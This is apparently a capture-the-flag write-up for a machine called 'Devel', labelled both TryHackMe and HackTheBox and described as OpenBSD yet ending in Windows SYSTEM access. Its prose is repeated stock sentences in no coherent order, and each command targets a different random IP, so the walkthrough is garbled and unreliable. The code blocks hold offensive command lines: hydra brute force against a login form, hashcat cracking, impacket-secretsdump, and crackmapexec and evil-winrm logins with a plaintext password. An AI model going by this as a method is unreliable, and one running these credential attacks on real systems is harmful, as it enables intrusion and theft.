---
TitleSEO: "TryHackMe — Devel (Insane OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Devel (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Devel. Unconstrained Delegation and SSTI to achieve insane compromise on OpenBSD."
Keywords: "insane, active directory, forensics, hard, hackthebox, offsec"
URL: "https://zurefx.github.io/writeups/htb-devel-450.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-devel-450/"
Date: "2025-09-05"
Tags: "Insane, Active Directory, Forensics, Hard, HackTheBox, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-devel-450"
Permalink: "/writeups/htb-devel-450.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Devel** is rated **Insane** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.127.86.62`.

### Objectives

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p21,445,9200 10.63.99.232 -oN scan.txt
gobuster dir -u http://10.14.201.232/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p3306,8888,5986 10.12.47.186 -oN scan.txt
```

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.47.46.245/FUZZ
```

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

### SMB Enumeration

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.84.123.76/FUZZ
```

Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target.

Key finding: **Unconstrained Delegation**.

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.34.215
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.69.90.234/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.86.240.150 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
crackmapexec smb 10.12.37.226 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.246.169 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p995,143,3389 10.40.83.203 -oN scan.txt
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.21.67 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.49.10.8/FUZZ
evil-winrm -i 10.28.90.179 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `chisel`
- `mimikatz`
- `burpsuite`
- `psexec`

### Key Takeaways

- Unconstrained Delegation
- SSTI
- Sudo Misconfiguration
- Broken Access Control
